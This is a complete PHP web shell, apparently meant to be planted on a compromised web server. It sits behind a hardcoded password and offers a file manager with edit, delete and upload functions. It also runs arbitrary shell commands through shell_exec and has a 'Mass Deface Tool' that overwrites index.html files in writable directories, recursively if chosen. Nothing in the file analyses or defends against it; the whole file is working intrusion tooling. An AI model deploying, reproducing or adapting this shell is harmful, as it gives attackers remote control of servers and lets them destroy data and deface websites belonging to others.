<?php

$password = "badr";
session_start();


if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

if(!isset($_SESSION['logged_in']) && $_POST['password'] != $password) {
    
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
            .login-box { background: #fff; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h2 { text-align: center; color: #333; }
            input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            input[type="submit"] { background: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
            input[type="submit"]:hover { background: #45a049; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Webshell ng pogi</h2>
            <form method="post">
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>';
    exit;
}

$_SESSION['logged_in'] = true;


$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir);


if(isset($_GET['action'])) {
    switch($_GET['action']) {
        case 'rename':
            if(isset($_POST['oldname']) && isset($_POST['newname'])) {
                $old = $current_dir . '/' . $_POST['oldname'];
                $new = $current_dir . '/' . $_POST['newname'];
                if(file_exists($old) && !file_exists($new)) {
                    
                    if(basename($_SERVER['SCRIPT_FILENAME']) != $_POST['oldname']) {
                        rename($old, $new);
                    }
                }
                header("Location: ?dir=".urlencode($current_dir));
                exit;
            }
            break;
            
        case 'delete':
            if(isset($_GET['file'])) {
                $target = $current_dir . '/' . $_GET['file'];
                if(is_dir($target)) {
                
                    $files = array_diff(scandir($target), array('.','..'));
                    foreach ($files as $file) {
                        $path = "$target/$file";
                        is_dir($path) ? rmdir($path) : unlink($path);
                    }
                    rmdir($target);
                } else {
                
                    if(basename($_SERVER['SCRIPT_FILENAME']) != $_GET['file']) {
                        unlink($target);
                    }
                }
                header("Location: ?dir=".urlencode($current_dir));
                exit;
            }
            break;
            
        case 'edit':
            if(isset($_POST['save']) && isset($_POST['file']) && isset($_POST['content'])) {
              
                if(basename($_SERVER['SCRIPT_FILENAME']) != $_POST['file']) {
                    file_put_contents($current_dir . '/' . $_POST['file'], $_POST['content']);
                }
                header("Location: ?dir=".urlencode($current_dir));
                exit;
            }
            break;
            
        case 'upload':
            if(isset($_FILES['file'])) {
                $target = $current_dir . '/' . basename($_FILES['file']['name']);
                
                if(basename($_SERVER['SCRIPT_FILENAME']) != basename($_FILES['file']['name'])) {
                    move_uploaded_file($_FILES['file']['tmp_name'], $target);
                }
                header("Location: ?dir=".urlencode($current_dir));
                exit;
            }
            break;
            
        case 'mkdir':
            if(isset($_POST['name'])) {
                mkdir($current_dir . '/' . $_POST['name']);
                header("Location: ?dir=".urlencode($current_dir));
                exit;
            }
            break;
    }
}


if(isset($_GET['xryukz']) && $_GET['xryukz'] == 'mass_deface') {
    function recursive_mass_deface($dir,$filename,$content) {
        if(is_writable($dir)) {
            $dir_contents = scandir($dir);
            foreach($dir_contents as $item) {
                $full_path = "$dir/$item";
                $target_file = $full_path.'/'.$filename;
                if($item === '.' || $item === '..') {
                    @file_put_contents($target_file, $content);
                } else {
                    if(is_dir($full_path)) {
                        if(is_writable($full_path)) {
                            echo "[<font color=lime>SUCCESS</font>] $target_file<br>";
                            @file_put_contents($target_file, $content);
                            recursive_mass_deface($full_path,$filename,$content);
                        }
                    }
                }
            }
        }
    }
    
    function simple_mass_deface($dir,$filename,$content) {
        if(is_writable($dir)) {
            $dir_contents = scandir($dir);
            foreach($dir_contents as $item) {
                $full_path = "$dir/$item";
                $target_file = $full_path.'/'.$filename;
                if($item === '.' || $item === '..') {
                    @file_put_contents($target_file, $content);
                } else {
                    if(is_dir($full_path)) {
                        if(is_writable($full_path)) {
                            echo "[<font color=lime>SUCCESS</font>] $target_file<br>";
                            @file_put_contents($target_file, $content);
                        }
                    }
                }
            }
        }
    }
    
    if(isset($_POST['execute'])) {
        echo "<div style='margin: 5px; padding: 5px; border: 1px solid #ccc;'>";
        if($_POST['deface_type'] == 'recursive') {
            recursive_mass_deface($_POST['target_dir'], $_POST['target_file'], $_POST['deface_content']);
        } elseif($_POST['deface_type'] == 'simple') {
            simple_mass_deface($_POST['target_dir'], $_POST['target_file'], $_POST['deface_content']);
        }
        echo "</div>";
    } else {
        
        echo "<div style='font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; background: #f9f9f9;'>";
        echo "<h3 style='color: #333;'>Mass Deface Tool</h3>";
        echo "<form method='post'>";
        echo "<p><strong>Deface Type:</strong><br>";
        echo "<input type='radio' name='deface_type' value='simple' checked> Simple (current directory only)<br>";
        echo "<input type='radio' name='deface_type' value='recursive'> Recursive (all subdirectories)</p>";
        echo "<p><strong>Target Directory:</strong><br>";
        echo "<input type='text' name='target_dir' value='".htmlspecialchars($current_dir)."' style='width: 100%; padding: 5px;'></p>";
        echo "<p><strong>Filename to Create:</strong><br>";
        echo "<input type='text' name='target_file' value='index.html' style='width: 100%; padding: 5px;'></p>";
        echo "<p><strong>Deface Content:</strong><br>";
        echo "<textarea name='deface_content' style='width: 100%; height: 200px; padding: 5px;'>Hacked by Security Researcher</textarea></p>";
        echo "<input type='submit' name='execute' value='Execute Mass Deface' style='background: #f44336; color: white; border: none; padding: 10px; width: 100%; cursor: pointer;'>";
        echo "</form>";
        echo "</div>";
    }
    exit;
}


?>
<!DOCTYPE html>
<html>
<head>
    <title>bypass</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: #333; color: white; padding: 10px 20px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .breadcrumb { padding: 10px; background: #e9e9e9; margin-bottom: 20px; }
        .file-list { background: white; border: 1px solid #ddd; }
        .file-list table { width: 100%; border-collapse: collapse; }
        .file-list th, .file-list td { padding: 10px; border: 1px solid #ddd; text-align: left; }
        .file-list th { background: #f4f4f4; }
        .file-list tr:hover { background: #f9f9f9; }
        .action-btn { display: inline-block; padding: 5px 10px; margin: 2px; text-decoration: none; color: white; border-radius: 3px; font-size: 12px; }
        .edit-btn { background: #4CAF50; }
        .rename-btn { background: #FF9800; }
        .delete-btn { background: #f44336; }
        .tools { margin: 20px 0; }
        .tool-box { background: white; border: 1px solid #ddd; padding: 15px; margin-bottom: 20px; }
        .tool-box h3 { margin-top: 0; }
        .form-group { margin-bottom: 10px; }
        .form-group label { display: block; margin-bottom: 5px; }
        .form-group input[type="text"], .form-group textarea { width: 100%; padding: 8px; border: 1px solid #ddd; }
        .form-group textarea { height: 150px; }
        .btn { background: #333; color: white; border: none; padding: 10px 15px; cursor: pointer; }
        .btn:hover { background: #555; }
        .btn.logout { background: #f44336; }
        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); }
        .modal-content { background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 500px; }
        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
        .close:hover, .close:focus { color: black; text-decoration: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <h1>File Manager</h1>
        <a href="?logout" class="btn logout">Logout</a>
    </div>
    
    <div class="container">
        <div class="breadcrumb">
            <?php
            $path_parts = explode('/', trim($current_dir, '/'));
            $current_path = '';
            foreach($path_parts as $part) {
                $current_path .= '/' . $part;
                echo '<a href="?dir='.urlencode($current_path).'">'.$part.'</a> / ';
            }
            ?>
        </div>
        
        <div class="tools">
            <div class="tool-box">
                <h3>Quick Tools</h3>
                <a href="?xryukz=mass_deface&dir=<?= urlencode($current_dir) ?>" class="btn">Mass Deface Tool</a>
                <a href="?action=command" class="btn">Command Execution</a>
            </div>
            
            <div class="tool-box">
                <h3>Upload File</h3>
                <form method="post" enctype="multipart/form-data" action="?action=upload&dir=<?= urlencode($current_dir) ?>">
                    <div class="form-group">
                        <input type="file" name="file" required>
                    </div>
                    <input type="submit" value="Upload" class="btn">
                </form>
            </div>
            
            <div class="tool-box">
                <h3>Create Directory</h3>
                <form method="post" action="?action=mkdir&dir=<?= urlencode($current_dir) ?>">
                    <div class="form-group">
                        <input type="text" name="name" placeholder="Directory name" required>
                    </div>
                    <input type="submit" value="Create" class="btn">
                </form>
            </div>
        </div>
        
        <div class="file-list">
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    
                    if($current_dir != '/') {
                        $parent_dir = dirname($current_dir);
                        echo '<tr>
                            <td><a href="?dir='.urlencode($parent_dir).'">..</a></td>
                            <td>Directory</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                        </tr>';
                    }
                    
                    
                    if($handle = opendir($current_dir)) {
                        while(false !== ($entry = readdir($handle))) {
                            if($entry != "." && $entry != "..") {
                                $full_path = $current_dir . '/' . $entry;
                                $is_dir = is_dir($full_path);
                                $size = $is_dir ? '-' : format_size(filesize($full_path));
                                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                                $modified = date("Y-m-d H:i:s", filemtime($full_path));
                                
                                echo '<tr>
                                    <td>';
                                if($is_dir) {
                                    echo '<a href="?dir='.urlencode($full_path).'">'.$entry.'/</a>';
                                } else {
                                    echo $entry;
                                }
                                echo '</td>
                                    <td>'.($is_dir ? 'Directory' : 'File').'</td>
                                    <td>'.$size.'</td>
                                    <td>'.$perms.'</td>
                                    <td>'.$modified.'</td>
                                    <td>';
                                
                                if(!$is_dir) {
                                    echo '<a href="?action=edit&file='.urlencode($entry).'&dir='.urlencode($current_dir).'" class="action-btn edit-btn">Edit</a> ';
                                }
                                echo '<a href="#" onclick="showRenameModal(\''.htmlspecialchars($entry, ENT_QUOTES).'\')" class="action-btn rename-btn">Rename</a> ';
                                echo '<a href="?action=delete&file='.urlencode($entry).'&dir='.urlencode($current_dir).'" class="action-btn delete-btn" onclick="return confirm(\'Are you sure?\')">Delete</a>
                                    </td>
                                </tr>';
                            }
                        }
                        closedir($handle);
                    }
                    
                    function format_size($bytes) {
                        if ($bytes >= 1073741824) {
                            return number_format($bytes / 1073741824, 2) . ' GB';
                        } elseif ($bytes >= 1048576) {
                            return number_format($bytes / 1048576, 2) . ' MB';
                        } elseif ($bytes >= 1024) {
                            return number_format($bytes / 1024, 2) . ' KB';
                        } elseif ($bytes > 1) {
                            return $bytes . ' bytes';
                        } elseif ($bytes == 1) {
                            return '1 byte';
                        } else {
                            return '0 bytes';
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
    
    
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="document.getElementById('renameModal').style.display='none'">&times;</span>
            <h2>Rename File/Directory</h2>
            <form method="post" action="?action=rename&dir=<?= urlencode($current_dir) ?>">
                <input type="hidden" id="oldname" name="oldname" value="">
                <div class="form-group">
                    <label for="newname">New Name:</label>
                    <input type="text" id="newname" name="newname" required style="width: 100%; padding: 8px;">
                </div>
                <input type="submit" value="Rename" class="btn">
            </form>
        </div>
    </div>
    
    <script>
        function showRenameModal(oldname) {
            document.getElementById('oldname').value = oldname;
            document.getElementById('newname').value = oldname;
            document.getElementById('renameModal').style.display = 'block';
        }
        
    
        window.onclick = function(event) {
            if (event.target == document.getElementById('renameModal')) {
                document.getElementById('renameModal').style.display = "none";
            }
        }
    </script>
</body>
</html>

<?php

if(isset($_GET['action']) && $_GET['action'] == 'edit' && isset($_GET['file'])) {
    $file = $current_dir . '/' . $_GET['file'];
    if(file_exists($file) && !is_dir($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Editing '.htmlspecialchars($_GET['file']).'</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
                .editor-box { background: white; max-width: 800px; margin: 20px auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                h2 { margin-top: 0; }
                textarea { width: 100%; height: 400px; font-family: monospace; padding: 10px; border: 1px solid #ddd; }
                .btn { background: #4CAF50; color: white; border: none; padding: 10px 15px; margin-top: 10px; cursor: pointer; }
                .btn.cancel { background: #f44336; }
            </style>
        </head>
        <body>
            <div class="editor-box">
                <h2>Editing: '.htmlspecialchars($_GET['file']).'</h2>
                <form method="post" action="?action=edit&dir='.urlencode($current_dir).'">
                    <input type="hidden" name="file" value="'.htmlspecialchars($_GET['file']).'">
                    <textarea name="content">'.$content.'</textarea><br>
                    <input type="submit" name="save" value="Save" class="btn">
                    <a href="?dir='.urlencode($current_dir).'" class="btn cancel">Cancel</a>
                </form>
            </div>
        </body>
        </html>';
        exit;
    }
}   


if(isset($_GET['action']) && $_GET['action'] == 'command') {
    if(isset($_POST['cmd'])) {
        echo '<pre>'.htmlspecialchars(shell_exec($_POST['cmd'])).'</pre>';
    }
    
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Command Execution</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
            .cmd-box { background: white; max-width: 800px; margin: 20px auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h2 { margin-top: 0; }
            textarea { width: 100%; height: 100px; font-family: monospace; padding: 10px; border: 1px solid #ddd; }
            .btn { background: #4CAF50; color: white; border: none; padding: 10px 15px; margin-top: 10px; cursor: pointer; }
            .btn.cancel { background: #f44336; }
            pre { background: #333; color: #0f0; padding: 10px; border-radius: 5px; overflow-x: auto; }
        </style>
    </head>
    <body>
        <div class="cmd-box">
            <h2>Command Execution</h2>
            <form method="post" action="?action=command&dir='.urlencode($current_dir).'">
                <input type="text" name="cmd" value="'.(isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : 'whoami').'" style="width: 100%; padding: 10px; margin-bottom: 10px;">
                <input type="submit" value="Execute" class="btn">
                <a href="?dir='.urlencode($current_dir).'" class="btn cancel">Back to File Manager</a>
            </form>
        </div>
    </body>
    </html>';
    exit;
}
?>